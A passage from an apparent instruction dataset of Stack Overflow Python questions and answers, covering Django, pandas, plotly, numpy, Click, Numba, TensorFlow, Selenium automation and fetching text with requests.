noreferrer\">subqueries<\/a>:<\/p>\n<pre><code>from django.db.models import OuterRef, Subquery\n\n\nclass DonationQuerySet(QuerySet):\n    ...\n    \n    def with_donations_stats(self):\n        # Subquery for wallet donation\n        # Added order_by because it appears you have some default ordering\n        wallet_donation = WalletTransaction.objects.filter(\n            condition=OuterRef('pk')\n        ).order_by().values('condition').annotate(amount_sum=Sum('amount')).values('amount_sum')[:1]\n        \n        # Subquery for normal donation\n        normal_donation = Transaction.objects.filter(\n            condition=OuterRef('pk')\n        ).values('condition').annotate(amount_sum=Sum('amount')).values('amount_sum')[:1]\n        \n        return self.annotate(\n            wallet_donation=Coalesce(Subquery(wallet_donation), 0),\n            normal_donation=Coalesce(Subquery(normal_donation), 0),\n            total_donation=F('wallet_donation') + F('normal_donation')\n        )\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How can I like a picture on Instagram using its link with the help of Selenium (Python)?<p>My purpose was to write a program that could log in to Instagram and then like a picture using a certain link. And in the end, it should make a screenshot. The main trouble is that if the program gets a link for a second time my browser logs out of Instagram so I can't get a like on a photo. I've been searching for any decisions, but I found nothing about my problem. Please, help! Here's my code.<\/p>\n<pre><code>import time\nfrom selenium import webdriver\nfrom selenium.webdriver.support import expected_conditions as EC\nfrom selenium.webdriver.common.by import By\nfrom selenium.webdriver.support.wait import WebDriverWait\n\ndriver = webdriver.Chrome('chromedriver.exe')\ndriver.get('https:\/\/www.instagram.com')\n\n\ndef log_in(un, pw):\n    username = WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.CSS_SELECTOR, &quot;input[name='username']&quot;)))\n    username.clear()\n    for i in un:\n        time.sleep(0.01)\n        username.send_keys(i)\n\n    password = WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.CSS_SELECTOR, &quot;input[name='password']&quot;)))\n    password.clear()\n    for i in pw:\n        time.sleep(0.01)\n        password.send_keys(i)\n\n    login_button = WebDriverWait(driver, 2).until(\n        EC.element_to_be_clickable((By.CSS_SELECTOR, &quot;button[type='submit']&quot;))).click()\n\n    driver.get('https:\/\/www.instagram.com\/p\/CSXFbIKjKxO\/?utm_source=ig_web_copy_link')\n    driver.find_elements_by_link_text('Like').click()\n    filename = un + '.png'\n    driver.save_screenshot(filename)\n\n\nlog_in('login', 'password')\ndriver.close()\n<\/code><\/pre>","output_text":"<p>The like web element is basically a svg element, you could try the below xpath :<\/p>\n<pre><code>\/\/*[name()='svg' and @aria-label='Like']\n<\/code><\/pre>\n<p><strong>in code<\/strong>, replace this :<\/p>\n<pre><code>driver.find_elements_by_link_text('Like').click()\n<\/code><\/pre>\n<p>to<\/p>\n<pre><code>WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, &quot;\/\/*[name()='svg' and @aria-label='Like']&quot;))).click()\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to solve the translation\/localisation of JavaScript external files since Django does not allow built-it tags in other files?<p>I was looking in other questions.<\/p>\n<ul>\n<li>I know that Django allows to use built-in tags in the internal JavaScript code on HTML page, but it is a bad practice that a professional developer would not do;<\/li>\n<li>I know that Django does not allow to use built-in tags in the external JavaScript files. Differently of it, Go Hugo allows.<\/li>\n<li>I considered the question <a href=\"https:\/\/stackoverflow.com\/questions\/52472830\/django-translations-in-javascript-files\">Django translations in Javascript files<\/a>, but I do not know if it is a bad practice to generate the JavaScript with the same name but with with different language abbreviation, as <code>table-en.js<\/code>, <code>table-fr.js<\/code>, <code>table-pt-br.js<\/code>, <code>table-pt-pt.js<\/code>, etc.<\/li>\n<\/ul>\n<p>The small code, for example:<\/p>\n<pre class=\"lang-js prettyprint-override\"><code>var preTtitle = 'List of colours and icon in';\n\nconst styles = \n[\n  { name: 'adwaita-plus', title: ' ' + preTtitle + 'Adwaita++' },\n  { name: 'suru-plus', title: ' ' + preTtitle + 'Suru++' },\n  { name: 'suru-plus-ubuntu', title: ' ' + preTtitle + 'Ubuntu++' },\n  { name: 'yaru-plus', title: ' ' + preTtitle + 'Yaru++' }\n];\n\n<\/code><\/pre>\n<p>I also need to translate the table columns:<\/p>\n<pre class=\"lang-js prettyprint-override\"><code>firstHeader.textContent = 'Name of colour';\nsecondHeader.textContent = 'Preview of icons';\n\ntrHeader.appendChild(firstHeader);\ntrHeader.appendChild(secondHeader);\n\nthead.appendChild(trHeader);\n<\/code><\/pre>\n<p>I want to translate <code>'List of colours and icon in'<\/code>, <code>'Name of colour'<\/code> and <code>'Preview of icons'<\/code>.<\/p>\n<p>As Django does not allow to use the built-tag of translation in this file, how do you solve it?<\/p>\n<p>I am sure if the question <a href=\"https:\/\/stackoverflow.com\/questions\/52472830\/django-translations-in-javascript-files\">Django translations in Javascript files<\/a> is the only solution and good or bad practice.<\/p>","output_text":"<p>you can make this work creating functions inside a javascript file and import that file in the html. Afterwards, translate the objects you want inside your template, then pass the translated texts to the functions you created. There is no other way, don't worry about bad practices.<\/p>\n<pre><code>&lt;script src=&quot;{% static 'js\/translation_helpers.js' %}&quot;&gt;&lt;\/script&gt;\n&lt;script&gt;\n    let frenchText = {% translate &quot;something in french&quot; %}\n    functionYouCreated(translatedText, 'fr')\n    let englishText = {% translate &quot;something in english&quot; %}\n    functionYouCreated(translatedText, 'en')\n&lt;\/script&gt;\n<\/code><\/pre>\n<p>To change translations languages in the template see <a href=\"https:\/\/docs.djangoproject.com\/en\/3.2\/topics\/i18n\/translation\/#switching-language-in-templates\" rel=\"nofollow noreferrer\">https:\/\/docs.djangoproject.com\/en\/3.2\/topics\/i18n\/translation\/#switching-language-in-templates<\/a><\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Iterating over dataframes and adding items from a list<p>Quite new to python for data analysis, still a noob.<\/p>\n<p>I have a list of pandas data frames (+100) who's variables are saved into a list.<\/p>\n<p>I then have the variables saved in another list in string format to add into the dataFrames as an identifier when plotting.<\/p>\n<p>I have defined a function to prepare the tables for later feature engineering.<\/p>\n<p>I want to iterate through each data frame and add the corresponding strings into a column called &quot;Strings&quot;<\/p>\n<pre><code>df = [df1, df2, df3]\nstrings = ['df1', 'df2', 'df3']\n\n\ndef mindex(df):\n# remove time index and insert Strings column \n    df.reset_index(inplace=True)\n    df.insert(1, &quot;Strings&quot;, &quot;&quot;)\n\n    # iterate through each table adding the string values \n    for item in enumerate(df):\n        for item2 in strings:\n            df['Strings'] = item2\n\n\n# the loop to cycle through all the dateframes using the function above\nfor i in df:\n    mindex(i)\n<\/code><\/pre>\n<p>When ever I use the function above it only fills the last value into all of the dataframes. I would like to note that all the dataframes are within the same date range, as I have tried to use this as a way to stop the iteration with no win.<\/p>\n<p>Can anyone point me in the right direction! Google has not been my friend so far<\/p>","output_text":"<p>In line <code>df['Strings'] = item2<\/code> you assign variable item2 into entire column df[&quot;Strings&quot;].\nSo first iteration assigns &quot;df1&quot;, second assigns &quot;df2&quot; and ends with &quot;df3&quot; and this is what you see finally.<\/p>\n<p>if you want to have in column <em>Strings<\/em> entirely populated by &quot;df1&quot; for df1, &quot;df2&quot; for df2 etc. you have to:<\/p>\n<pre><code>def mindex(dfs: list, strings: list) -&gt; list:\n    final_dfs = []\n    for single_df, df_name in zip(dfs, strings):\n        single_df = single_df.copy()\n        single_df.reset_index(inplace=True)\n        single_df.insert(1, &quot;Strings&quot;, &quot;&quot;)\n\n        single_df['Strings'] = df_name\n        final_dfs.append(single_df)\n    return final_dfs\n\ndfs = [df1, df2, df3]\nstrings = ['df1', 'df2', 'df3']\n\nresult = mindex(dfs, strings)\n<\/code><\/pre>\n<p>Few takeaways:<\/p>\n<ol>\n<li>if you define list of dfs, name it dfs (plural), not df.<\/li>\n<\/ol>\n<pre><code>dfs = [df1, df2, df3]\n<\/code><\/pre>\n<ol start=\"2\">\n<li>If you iterate through pandas DataFrame, use df.iterrows(). It will generate indices and rows, so you don't need to apply <strong>enumerate<\/strong>.<\/li>\n<\/ol>\n<pre><code>for idx, row in df.iterrows():\n    ....\n<\/code><\/pre>\n<ol start=\"3\">\n<li>if you use variable in for loop that is not going to be used, like in your example <strong>item<\/strong>, use underscore instead. It is good practice for useless variable:<\/li>\n<\/ol>\n<pre><code>for _ in enumerate(df):\n    for item2 in strings:\n        df['Strings'] = item2\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Fixed heatmap table with customised colours<p>I've been breaking my head with this problem. I want to make <strong>in plotly<\/strong> something like this: <a href=\"https:\/\/i.stack.imgur.com\/Ey2Sa.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/Ey2Sa.png\" alt=\"enter image description here\" \/><\/a><\/p>\n<p>This is very common in excel plots, so I want to see if it is possible to make this in Plotly for python.<\/p>\n<p>The idea is to customise the plot, I mean, <strong>show exactly what the image above shows<\/strong>, I need this to use it as a background in another plot that I made. So, I need to know if its possible to make something like this:<\/p>\n<pre><code>import pandas as pd\nimport numpy as np\nimport matplotlib.pyplot as plt\nfrom matplotlib import colors\nIndex= ['1', '2', '3', '4', '5']\nCols = ['A', 'B', 'C', 'D','E']\ndata= [[ 0, 0,1, 1,2],[ 0, 1,2, 2,3],[ 1, 2,2, 3,4],[1, 2,3, 4,4],[ 2, 3,4, 4,4]]\ndf = pd.DataFrame(data, index=Index, columns=Cols)\ncmap = colors.ListedColormap(['darkgreen','lightgreen','yellow','orange','red'])\nbounds=[0, 1, 2, 3, 4,5]\nnorm = colors.BoundaryNorm(bounds, cmap.N)\nheatmap = plt.pcolor(np.array(data), cmap=cmap, norm=norm)\nplt.colorbar(heatmap, ticks=[0, 1, 2, 3,4,5])\nplt.show()\n<\/code><\/pre>\n<p>And that code give us this plot:\n<a href=\"https:\/\/i.stack.imgur.com\/xjwjn.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/xjwjn.png\" alt=\"enter image description here\" \/><\/a><\/p>\n<p>Sorry to bother but by this point I'm completely hopeless haha, I've searched a lot and found nothing.<\/p>\n<p>Thanks so much for reading, any help is appreciated.<\/p>","output_text":"<p>The MPL heatmap you presented has some remaining issues but was created plotly. I used this example from the <a href=\"https:\/\/plotly.com\/python\/colorscales\/#reversing-a-builtin-color-scale\" rel=\"nofollow noreferrer\">official reference<\/a> as a basis.<\/p>\n<pre><code>import plotly.express as px\n\ndata= [[ 0, 0, 1, 1, 2],[ 0, 1, 2, 2, 3],[ 1, 2, 2, 3, 4],[1, 2, 3, 4, 4],[2, 3, 4, 4, 4]]\n\nfig = px.imshow(data, color_continuous_scale=[&quot;darkgreen&quot;,&quot;lightgreen&quot;,&quot;yellow&quot;,&quot;orange&quot;,&quot;red&quot;])\n\nfig.update_yaxes(autorange=True)\nfig.update_layout(\n    xaxis = dict(\n        tickmode = 'linear',\n        tick0 = 0,\n        dtick = 1\n    ),\n    autosize=False,\n    width=500\n)\n# fig.layout['coloraxis']['colorbar']['x'] = 1.0\nfig.update_layout(coloraxis_colorbar=dict(\n    tickvals=[0,1,2,3,4],\n    ticktext=[0,1,2,3,4],\n    x=1.0\n))\n\nfig.show()\n<\/code><\/pre>\n<p><a href=\"https:\/\/i.stack.imgur.com\/SUIKQ.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/SUIKQ.png\" alt=\"enter image description here\" \/><\/a><\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Use of underscore in interger values or Number values in Tensorflow documentation<p>if we check below documentation <a href=\"https:\/\/www.tensorflow.org\/recommenders\/examples\/basic_retrieval\" rel=\"nofollow noreferrer\">https:\/\/www.tensorflow.org\/recommenders\/examples\/basic_retrieval<\/a> it uses underscore (_) in the integer values like for batch size . What does this underscore signifies is it same as decimal point.<\/p>","output_text":"<p>The underscores are for improved readability, but do not have any deeper meaning. See <a href=\"https:\/\/www.codingame.com\/playgrounds\/21\/whats-new-in-python-3-6\/pep-515-underscores-in-numeric-literals#:%7E:text=PEP%20515%3A%20Underscores%20in%20Numeric%20Literals,-PEP%20515%20adds&amp;text=Single%20underscores%20are%20allowed%20between,a%20row%20are%20not%20allowed.&amp;text=PEP%20written%20by%20Georg%20Brandl%20and%20Serhiy%20Storchaka.\" rel=\"nofollow noreferrer\">this<\/a> for more information. Here is an example:<\/p>\n<pre><code>import tensorflow\n\nds1 = tf.data.Dataset.random(seed=4).take(2_000)\nprint(len(list(ds1.map(lambda x: x))))\nds1 = tf.data.Dataset.random(seed=4).take(200_000)\nprint(len(list(ds1.map(lambda x: x))))\n<\/code><\/pre>\n<pre><code>2000\n200000\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Subtracting each a vector of Timestamps from each element of a Timestamp in pd.Series()<p>Consider two <code>pd.Series()<\/code>, <code>t<\/code> and <code>T<\/code>, where:<\/p>\n<pre><code>&gt;&gt;&gt; print(t)\n\n0       2006-04-17 00:00:00\n1       2006-04-18 00:00:00\n2       2006-04-19 00:00:00\n3       2006-04-20 00:00:00\n4       2006-04-21 00:00:00\n               ...         \n3522    2020-04-14 00:00:00\n3523    2020-04-15 00:00:00\n3524    2020-04-16 00:00:00\n3525    2020-04-17 00:00:00\n3526    2020-04-20 00:00:00\nName: tDate, Length: 3527, dtype: object\n\nprint(T)\n\n0     2004-09-15\n1     2004-10-20\n2     2004-11-17\n3     2004-12-22\n4     2005-01-19\n         ...    \n203   2021-08-18\n204   2021-09-15\n205   2021-10-20\n206   2021-11-17\n207   2021-12-22\nName: tDate, Length: 208, dtype: datetime64[ns]\n\n<\/code><\/pre>\n<p>I would like to get a <code>mat = np.array(len(t),len(T))<\/code> containing the difference in days between <em>each<\/em> element of t and <em>all<\/em> elements of T.<\/p>\n<p>I tried <code>np.array([_ - t for _ in T])<\/code> but this prints the Timestamps as <code>int<\/code>, while I need them as number of days between the two dates (also <code>int<\/code> tho). I also prefer to do it somehow in <code>numpy<\/code> so that it is faster.<\/p>\n<pre><code>np.array([_ - t for _ in T])\narray([[ -50025600000000000,  -50112000000000000,  -50198400000000000,\n        ..., -491788800000000000, -491875200000000000,\n        -492134400000000000],\n       [ -47001600000000000,  -47088000000000000,  -47174400000000000,\n        ..., -488764800000000000, -488851200000000000,\n        -489110400000000000],\n       [ -44582400000000000,  -44668800000000000,  -44755200000000000,\n        ..., -486345600000000000, -486432000000000000,\n        -486691200000000000],\n       ...,\n       [ 489456000000000000,  489369600000000000,  489283200000000000,\n        ...,   47692800000000000,   47606400000000000,\n          47347200000000000],\n       [ 491875200000000000,  491788800000000000,  491702400000000000,\n        ...,   50112000000000000,   50025600000000000,\n          49766400000000000],\n       [ 494899200000000000,  494812800000000000,  494726400000000000,\n        ...,   53136000000000000,   53049600000000000,\n          52790400000000000]], dtype='timedelta64[ns]')\n<\/code><\/pre>","output_text":"<p>I think you need subtract with broadcasting with casting to days:<\/p>\n<pre><code>#if necessary\n#T = T.to_numpy()\n#t = t.to_numpy()\n\na = (T[:, None]  - t).astype('timedelta64[D]')\nprint (a)\n[[ -579  -580  -581  -582  -583 -5690 -5691 -5692 -5693 -5696]\n [ -544  -545  -546  -547  -548 -5655 -5656 -5657 -5658 -5661]\n [ -516  -517  -518  -519  -520 -5627 -5628 -5629 -5630 -5633]\n [ -481  -482  -483  -484  -485 -5592 -5593 -5594 -5595 -5598]\n [ -453  -454  -455  -456  -457 -5564 -5565 -5566 -5567 -5570]\n [ 5602  5601  5600  5599  5598   491   490   489   488   485]\n [ 5630  5629  5628  5627  5626   519   518   517   516   513]\n [ 5665  5664  5663  5662  5661   554   553   552   551   548]\n [ 5693  5692  5691  5690  5689   582   581   580   579   576]\n [ 5728  5727  5726  5725  5724   617   616   615   614   611]]\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Supply either STDIN or a file pathname option to Python Click CLI script<p>I'm trying out Click for the first time but I've hit a stumbling block.<\/p>\n\n<p>I want my (two) subcommands to either take a file pathname option <em>or<\/em> accept file contents from STDIN.<\/p>\n\n<ul>\n<li><p>Allowed: Use a path for --compose-file<\/p>\n\n<pre class=\"lang-sh prettyprint-override\"><code>.\/docker-secret-helper.py secret-hash-ini --compose-file docker-compose-test.yml\n<\/code><\/pre><\/li>\n<li><p>Allowed: Use contents of a file as stdin<\/p>\n\n<pre class=\"lang-sh prettyprint-override\"><code>cat docker-compose-test.yml | .\/docker-secret-helper.py secret-hash-ini\n<\/code><\/pre>\n\n<p>(Should there be an option to indicate stdin, e.g., <code>-i<\/code>, or whatever?)<\/p><\/li>\n<li><p>Not Allowed: Neither --compose-file nor stdin passed<\/p>\n\n<pre class=\"lang-sh prettyprint-override\"><code>.\/docker-secret-helper.py secret-hash-ini\n<\/code><\/pre>\n\n<p>Should return something like: <code>You must either pass --compose-file or pipe in stdin.<\/code><\/p><\/li>\n<\/ul>\n\n<p>Current Script<\/p>\n\n<p>My current script accepts (only) the file pathname (via <code>--compose-file<\/code>):<\/p>\n\n<pre class=\"lang-py prettyprint-override\"><code>#!\/usr\/bin\/env python\n\nimport click\nfrom DockerSecretHelper import DockerSecretHelper\n\nCONTEXT_SETTINGS = dict(help_option_names=['-h', '--help'])\n\n@click.group(context_settings=CONTEXT_SETTINGS)\ndef cli():\n    pass\n\n@cli.command(help=\"retrieves an ini-style file of variables to be used as env vars for docker-compose commmand\")\n@click.option('--compose-file', help='compose file to work with', required=True)\ndef secret_hash_ini(**kwargs):\n    helper = DockerSecretHelper()\n    print(helper.get_secret_hash_ini_format_from_compose_file(**kwargs))\n    # will need some kind of if block to call helper.get_secret_hash_ini_format_from_compose_contents(**kwargs) in the\n    #  case of stdin\n\n@cli.command(help=\"retrieves names\/values of external secrets; to be used by `docker secret set`\")\n@click.option('--compose-file', help='compose file to work with', required=True)\ndef external_secret_info_json(**kwargs):\n    helper = DockerSecretHelper()\n    print(helper.get_external_secret_info_as_json_from_compost_file(**kwargs))\n    # will need some kind of if block to call helper.get_external_secret_info_as_json_from_compose_contents(**kwargs) in\n    # the case of stdin\n\nif __name__ == '__main__':\n    cli()\n<\/code><\/pre>\n\n<p>How do I implement and enforce either STDIN <em>or<\/em> a file pathname (but not both).<\/p>\n\n<p>I'm open to changes to my command's syntax to better follow potential conventions.<\/p>\n\n<p>This question is similar to <a href=\"https:\/\/stackoverflow.com\/questions\/33193589\/creating-command-line-application-in-python-using-click\">Creating command line application in python using Click<\/a> so it might provide some building blocks (which I'm having trouble assembling).<\/p>","output_text":"<p>I would use click's <code>File<\/code> option type:<\/p>\n<pre><code>import click\nimport sys\n\n\n@click.group()\ndef cli():\n    pass\n\n\n@cli.command()\n@click.option('--compose-file', \n              help='compose file to work with',\n              type=click.File('r'),\n              default=sys.stdin)\ndef secret_hash_ini(compose_file):\n    with compose_file:\n        data = compose_file.read()\n\n    print(data)\n\n\nif __name__ == '__main__':\n    cli()\n<\/code><\/pre>\n<p>Assuming we have a file <code>example.txt<\/code> that contains the text:<\/p>\n<pre><code>This is a test.\n<\/code><\/pre>\n<p>Then we can specify a file with <code>--compose-file<\/code>:<\/p>\n<pre><code>$ python docker-secret-helper.py secret-hash-ini --compose-file example.txt\nThis is a test.\n<\/code><\/pre>\n<p>Or we can read from <code>stdin<\/code>:<\/p>\n<pre><code>$ python docker-secret-helper.py secret-hash-ini &lt; example.txt\nThis is a test.\n<\/code><\/pre>\n<p>We can't generate an error in the case that &quot;Neither --compose-file nor stdin passed&quot; because <code>stdin<\/code> is always available.  If we call <code>docker-secret-helper.py<\/code> without providing <code>--compose-file<\/code> and without redirecting <code>stdin<\/code>, it will simply hang waiting for input.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Why is numpy cartesian product slower than pure python version?<h3>Input<\/h3>\n<pre><code>import numpy as np\nimport itertools\n\na = np.array([ 1,  6,  7,  8, 10, 11, 13, 14, 15, 19, 20, 23, 24, 26, 28, 29, 33,\n       34, 41, 42, 43, 44, 45, 46, 47, 52, 54, 58, 60, 61, 65, 70, 75]).astype(np.uint8)\nb = np.array([ 2,  3,  4, 10, 12, 14, 16, 20, 22, 26, 28, 29, 30, 31, 34, 36, 37,\n       38, 39, 40, 41, 46, 48, 49, 50, 52, 53, 55, 56, 57, 59, 60, 63, 66,\n       67, 68, 69, 70, 71, 74]).astype(np.uint8)\nc = np.array([ 0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14, 15, 16,\n       17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33,\n       34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50,\n       51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67,\n       68, 69, 70, 71, 72, 73, 74, 75]).astype(np.uint8)\n<\/code><\/pre>\n<p>I would like to get the Cartesian product of the 3 arrays but I do not want any duplicate elements in one row <code>[1, 2, 1]<\/code> would not be valid and only one of these two would be valid <code>[10, 14, 0]<\/code> or <code>[14, 10, 0]<\/code> since 10 and 14 are both in <code>a<\/code> and <code>b<\/code>.<\/p>\n<h3>Python only<\/h3>\n<pre><code>def no_numpy():\n    combos = {tuple(set(i)): i for i in itertools.product(a, b, c)}\n    combos = [val for key, val in combos.items() if len(key) == 3]\n%timeit no_numpy() # 32.5 ms \u00b1 508 \u00b5s per loop\n<\/code><\/pre>\n<h3>Numpy<\/h3>\n<pre><code># Solution from (https:\/\/stackoverflow.com\/a\/11146645\/18158000)\ndef cartesian_product(*arrays):\n    broadcastable = np.ix_(*arrays)\n    broadcasted = np.broadcast_arrays(*broadcastable)\n    rows, cols = np.prod(broadcasted[0].shape), len(broadcasted)\n    dtype = np.result_type(*arrays)\n\n    out = np.empty(rows * cols, dtype=dtype)\n    start, end = 0, rows\n    for a in broadcasted:\n        out[start:end] = a.reshape(-1)\n        start, end = end, end + rows\n    return out.reshape(cols, rows).T\n\ndef numpy():\n    combos = {tuple(set(i)): i for i in cartesian_product(*[a, b, c])}\n    combos = [val for key, val in combos.items() if len(key) == 3]\n%timeit numpy() # 96.2 ms \u00b1 136 \u00b5s per loop\n<\/code><\/pre>\n<p>My guess is in the numpy version converting the <code>np.array<\/code> to a set is why it is much slower but when comparing strictly getting the initial products <code>cartesian_product<\/code> is much faster than <code>itertools.product<\/code>.<\/p>\n<p>Can the numpy version be modified in anyway to outperform the pure python solution or is there another solution that outperforms both?<\/p>","output_text":"<h2>Why current implementations are slow<\/h2>\n<p>While the first solution is faster than the second one, it is quite inefficient since it creates a lot of temporary CPython objects (at least 6 per item of <code>itertools.product<\/code>). <strong>Creating a lot of objects is expensive because they are dynamically allocated and reference-counted<\/strong> by CPython. The Numpy function <code>cartesian_product<\/code> is pretty fast but the iteration over the resulting array is very slow because it creates a lot of Numpy views and operates on <code>numpy.uint8<\/code> instead of CPython <code>int<\/code>. <strong>Numpy types and functions introduce a huge overhead for very small arrays<\/strong>.<\/p>\n<p>Numpy can be used to speed up this operation as shown by @AlainT but this is not trivial to do and Numpy does not shine to solve such problems.<\/p>\n<hr \/>\n<h2>How to improve performance<\/h2>\n<p>One solution is to use <strong>Numba<\/strong> to do the job yourself more efficiently and let the Numba's <em>JIT compiler<\/em> optimizes loops. You can use 3 nested loops to efficiently generate the value of the Cartesian product and filter items. A dictionary can be used to track already seen values. The tuple of 3 items can be <strong>packed<\/strong> into one integer so to reduce the memory footprint and improve performance (so the dictionary can better fit in CPU caches and avoid the creation of slow tuple objects).<\/p>\n<p>Here is the resulting code:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>import numba as nb\n\n# Signature of the function (parameter types)\n# Note: `::1` means the array is contiguous\n@nb.njit('(uint8[::1], uint8[::1], uint8[::1])')\ndef with_numba(a, b, c):\n    seen = dict()\n\n    for va in a:\n        for vb in b:\n            for vc in c:\n                # If the 3 values are different\n                if va != vb and vc != vb and vc != va:\n                    # Sort the 3 values using a fast sorting network\n                    v1, v2, v3 = va, vb, vc\n                    if v1 &gt; v2: v1, v2 = v2, v1\n                    if v2 &gt; v3: v2, v3 = v3, v2\n                    if v1 &gt; v2: v1, v2 = v2, v1\n\n                    # Compact the 3 values into one 32-bit integer\n                    packedKey = (np.uint32(v1) &lt;&lt; 16) | (np.uint32(v2) &lt;&lt; 8) | np.uint32(v3)\n\n                    # Is the sorted tuple (v1,v2,v3) already seen?\n                    if packedKey not in seen:\n                        # Add the value and remember the ordered tuple (va,vb,vc)\n                        packedValue = (np.uint32(va) &lt;&lt; 16) | (np.uint32(vb) &lt;&lt; 8) | np.uint32(vc)\n                        seen[packedKey] = packedValue\n\n    res = np.empty((len(seen), 3), dtype=np.uint8)\n\n    for i, packed in enumerate(seen.values()):\n        res[i, 0] = np.uint8(packed &gt;&gt; 16)\n        res[i, 1] = np.uint8(packed &gt;&gt; 8)\n        res[i, 2] = np.uint8(packed)\n\n    return res\n\nwith_numba(a, b, c)\n<\/code><\/pre>\n<hr \/>\n<h2>Benchmark<\/h2>\n<p>Here are results on my i5-9600KF processor:<\/p>\n<pre class=\"lang-none prettyprint-override\"><code>numpy:                         122.1 ms  (x 1.0)\nno_numpy:                       49.6 ms  (x 2.5)\nAlainT's solution:              49.0 ms  (x 2.5)\nmathfux's solution              34.2 ms  (x 3.5)\nmathfux's optimized solution     7.5 ms  (x16.2)\nwith_numba:                      4.9 ms  (x24.9)\n<\/code><\/pre>\n<p>The provided solution is about <strong>25 times faster<\/strong> than the slowest implementation and about <strong>1.5 time faster<\/strong> than the fastest provided implementation so far.<\/p>\n<p>The current Numba code is bounded by the speed of the Numba dictionary operations. The code can be optimized using more low-level tricks. On solution is to replace the dictionary by a <em>packed boolean array<\/em> (1 item = 1 bit) of size <code>256**3\/8<\/code> to track the values already seen (by checking the <code>packedKey<\/code>th bit). The packed values can be directly added in <code>res<\/code> if the fetched bit is not set. This requires <code>res<\/code> to be preallocated to the maximum size or to implement an exponentially growing array (like <code>list<\/code> in Python or <code>std::vector<\/code> in C++). Another optimization is to sort the list and use a <em>tiling<\/em> strategy so to improve <em>cache locality<\/em>. Such optimization are far from being easy to implement but I expect them to drastically speed up the execution.<\/p>\n<p>If you plan to use more arrays, then the hash-map can become a bottleneck and a bit-array can be quite big. While using tiling certainly help to reduce the memory footprint, you can speed up the implementation by a large margin using <a href=\"https:\/\/en.wikipedia.org\/wiki\/Bloom_filter\" rel=\"nofollow noreferrer\">Bloom filters<\/a>. This probabilist data structure can speed up the execution by skipping many duplicates without causing any <em>cache misses<\/em> and with a low memory footprint. You can remove most of the duplicates and then sort the array so to then remove the duplicates. Regarding your problem, a radix sort may be faster than usual sorting algorithms.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n model.predict return values<p>I am working in imdb dataset on reviews, when i want to predict the outcome of the user given input using the model.predict method in tensorflow it gives an array. How to interpret the results from that array?<\/p>\n<pre><code>string = str(input())\nnew_string = token.texts_to_sequences(string)\npadded_new_string = pad_sequences(new_string,maxlen = 120, truncating = 'post')\nprint(model.predict(padded_new_string))\n<\/code><\/pre>\n<p>Also i used binary classification using sigmoid<\/p>\n<pre><code>model = tf.keras.Sequential([\n    tf.keras.layers.Embedding(10000,16,input_length = 120),\n    tf.keras.layers.Flatten(),\n    tf.keras.layers.Dense(12,activation = 'relu'),\n    tf.keras.layers.Dense(6,activation = 'relu'),\n    tf.keras.layers.Dense(1,activation = 'sigmoid')\n    ])        \n<\/code><\/pre>\n<p>Any help will be helpful<\/p>","output_text":"<p>If I'm not mistaken <code>model.predict<\/code> returns <code>numpy<\/code> array for each corresponding prediction of the <code>y_test<\/code>. To interpret the values you could use <code>evaluate<\/code> method to find the accuracy of your model<\/p>\n<pre><code>score = model.evaluate(x_test, y_test, verbose=0)\nprint('Test loss:', score[0])\nprint('Test accuracy:', score[1])\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to get sentences from pastebin.com and put them into a list?<p>So I have this pastebin link here: <a href=\"https:\/\/pastebin.com\/raw\/egumzQZD\" rel=\"nofollow noreferrer\">https:\/\/pastebin.com\/raw\/egumzQZD<\/a>\nAnd I want a way for python to get the sentences in the pastebin link and put it in a list. Is there any way to do this? So for example:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>list = [\n'This is a sentence.',\n'This is another sentence.',\n'Oh look! Here\\'s another sentence!',\n'My... my... Another one.',\n'Dear god.... -sigh- here\\'s another one.',\n'I might stop here.'\n]\n<\/code><\/pre>\n<p>My goal is so that the python code can print a random sentence using:<\/p>\n<pre><code>print(random.choice(list))\n<\/code><\/pre>","output_text":"<p>you need to do <a href=\"https:\/\/stackoverflow.com\/tags\/web-scraping\/info\">web <strong>scraping<\/strong><\/a> here. A sample example using <code>requests<\/code> module<\/p>\n<pre><code>import requests\ndata = requests.get(&quot;https:\/\/pastebin.com\/raw\/egumzQZD&quot;)\nnew_list = data.text.split(&quot;\\r\\n&quot;)\n\nprint(new_list)\n<\/code><\/pre>\n<p>output<\/p>\n<pre><code>['This is a sentence.', 'This is another sentence.', &quot;Oh look! Here's 